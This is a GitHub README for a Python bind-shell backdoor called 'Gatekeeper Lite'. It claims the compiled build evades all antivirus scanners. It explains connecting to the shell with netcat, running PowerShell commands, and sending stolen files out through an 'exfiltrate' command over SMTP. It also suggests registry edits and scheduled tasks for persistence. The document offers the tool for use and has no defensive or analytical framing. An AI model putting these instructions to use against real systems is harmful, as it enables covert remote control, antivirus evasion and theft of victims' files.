# Gatekeeper Lite Backdoor
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)

[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fdievus%2FMayorSecBackdoor.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2Fdievus%2FMayorSecBackdoor?ref=badge_shield)
### Fully functioning bind-type backdoor
![MayorSecBackdoorLite](/images/backdoorlite.png)

This backdoor is a fully functioning bind shell and lite version of my full functioning Gatekeeper tool. It can be ran with Python or compiled to an exe and has full functioning command line access with Windows and Linux.  When compiled it bypasses all Antivirus solutions on Antiscan.me.

## Usage
Connect using Netcat after changing the port value to whatever you wish (default is 8180)

```nc ipaddr port```

Once connected you can utilize commands as normal.  If you wish to use Powershell commands, make sure to lead with 

```powershell <command here>```

This will execute the command.  Note that some Powershell functionality may crash the Netcat session requiring a reconnect.  

## SMTP Exfiltration
![SMTPExfil](/images/smtpexfil.png)

MayorSec Backdoor has built in exfiltration functionality via SMTP.  Use the below format from the command line.

```exfiltrate filename <sender_email> <sender_email_password> <receiver_email>```

## Compilation
This tool can be ran on systems that have Python3 installed, or can be compiled to exe using Pyinstaller.  I recommend using the GUI version of Pyinstaller called "Auto Py to EXE" which allows for the easy addition of an exe icon for the application.  

## Notes
Windows will likely require a firewall rule in order to utilize this tool on machines with firewall enabled.  You can achieve persistence through typical manual Registry edits, scheduled tasks, etc. 


## License
[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fdievus%2FMayorSecBackdoor.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2Fdievus%2FMayorSecBackdoor?ref=badge_large)
